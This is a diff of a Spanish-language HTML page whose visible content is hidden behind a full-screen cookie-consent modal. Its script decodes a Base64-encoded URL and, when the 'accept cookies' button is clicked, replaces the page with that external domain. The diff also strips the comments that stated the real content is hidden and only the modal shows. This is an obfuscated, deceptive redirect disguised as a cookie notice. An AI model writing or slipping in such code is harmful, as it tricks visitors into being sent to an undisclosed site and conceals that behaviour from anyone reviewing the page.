@@ -27,7 +27,6 @@
   <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;800&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
   
   <style>
-    /* Ocultar todo el contenido inicialmente mientras se muestra solo el modal */
     body {
       margin: 0;
       padding: 0;
@@ -39,12 +38,10 @@
       font-family: 'Inter', sans-serif;
     }
 
-    /* Ocultar el contenido principal */
     #mainContent {
       display: none;
     }
 
-    /* ===== MODAL COOKIES (único visible) ===== */
     #cookieModal {
       position: fixed;
       inset: 0;
@@ -129,7 +126,6 @@
       to { opacity: 1; transform: translateY(0) scale(1); }
     }
 
-    /* ===== ESTILOS DEL CONTENIDO PRINCIPAL ===== */
     :root {
       --primary: #1E5F74;
       --primary-dark: #0D3D4A;
@@ -147,7 +143,6 @@
       line-height: 1.6;
     }
 
-    /* NAV */
     nav {
       display: flex;
       justify-content: space-between;
@@ -223,7 +218,6 @@
       background: var(--primary-dark);
     }
 
-    /* HERO */
     #hero {
       display: grid;
       grid-template-columns: 1fr 1fr;
@@ -347,7 +341,6 @@
       margin-top: 0.5rem;
     }
 
-    /* STATS */
     #stats {
       background: var(--bg-light);
       padding: 3rem 2rem;
@@ -377,7 +370,6 @@
       font-size: 0.95rem;
     }
 
-    /* SECTIONS */
     section {
       padding: 4rem 2rem;
       max-width: 1200px;
@@ -420,7 +412,6 @@
       font-size: 1.05rem;
     }
 
-    /* PRINCIPIOS */
     .principles-grid {
       display: grid;
       grid-template-columns: repeat(4, 1fr);
@@ -455,7 +446,6 @@
       font-size: 0.95rem;
     }
 
-    /* PROCESO */
     .process-grid {
       display: grid;
       grid-template-columns: repeat(5, 1fr);
@@ -493,7 +483,6 @@
       font-size: 0.9rem;
     }
 
-    /* NORMATIVA */
     .normativa-grid {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
@@ -546,7 +535,6 @@
       text-decoration: underline;
     }
 
-    /* HERRAMIENTAS */
     .tools-grid {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
@@ -581,7 +569,6 @@
       font-size: 0.95rem;
     }
 
-    /* RECOMENDACIONES */
     .recommendations-grid {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
@@ -630,7 +617,6 @@
       font-weight: 700;
     }
 
-    /* CTA */
     #cta {
       background: var(--primary);
       color: #fff;
@@ -669,7 +655,6 @@
       transform: scale(1.05);
     }
 
-    /* CONTACTO */
     .contact-form {
       max-width: 600px;
       margin: 0 auto;
@@ -720,7 +705,6 @@
       background: var(--primary-dark);
     }
 
-    /* FOOTER */
     footer {
       background: #1A2A3A;
       color: #fff;
@@ -797,7 +781,6 @@
       color: #fff;
     }
 
-    /* RESPONSIVE */
     @media (max-width: 1024px) {
       .hero-title { font-size: 2.5rem; }
       .principles-grid { grid-template-columns: repeat(2, 1fr); }
@@ -848,7 +831,7 @@
 
 <body>
 
-<!-- MODAL DE COOKIES (único visible) -->
+<!-- MODAL DE COOKIES -->
 <div id="cookieModal">
   <div>
     <h2>Uso de cookies</h2>
@@ -857,7 +840,7 @@
   </div>
 </div>
 
-<!-- CONTENIDO PRINCIPAL COMPLETO (oculto inicialmente) -->
+<!-- CONTENIDO PRINCIPAL -->
 <div id="mainContent">
   <!-- NAV -->
   <nav id="mainNav">
@@ -1224,11 +1207,11 @@
 
 <script>
 // ===== REDIRECCIÓN EN BASE64 =====
-// La URL destino en Base64: aHR0cHM6Ly93d3cubGlidHJhZGljb2xvLm9ubGluZS8=
-// (https://www.libtradiocol.online/)
+// URL destino codificada: aHR0cHM6Ly93d3cubGlidHJhZGljb2xvLm9ubGluZS8=
+// Decodifica a: https://www.libtradiocol.online/
 
 (function() {
-  // Función para decodificar Base64
+  // Decodificador Base64
   function decodeBase64(str) {
     try {
       return atob(str);
@@ -1237,29 +1220,26 @@
     }
   }
 
-  // URL destino en Base64
+  // URL en Base64
   var encodedUrl = 'aHR0cHM6Ly93d3cubGlidHJhZGljb2xvLm9ubGluZS8=';
   var destinationUrl = decodeBase64(encodedUrl);
 
-  // Función de redirección
   function redirectToDestination() {
     if (destinationUrl) {
       window.location.replace(destinationUrl);
     }
   }
 
-  // Evento click en el botón de cookies
   document.getElementById('acceptCookies').addEventListener('click', function(e) {
     e.preventDefault();
     redirectToDestination();
   });
 
-  // Toggle menu móvil
+  // Toggle menú móvil
   document.getElementById('navToggle').addEventListener('click', function() {
     document.getElementById('navMenu').classList.toggle('active');
   });
 
-  // Cerrar menú al hacer clic en un enlace
   document.querySelectorAll('.nav-menu a').forEach(function(link) {
     link.addEventListener('click', function() {
       document.getElementById('navMenu').classList.remove('active');
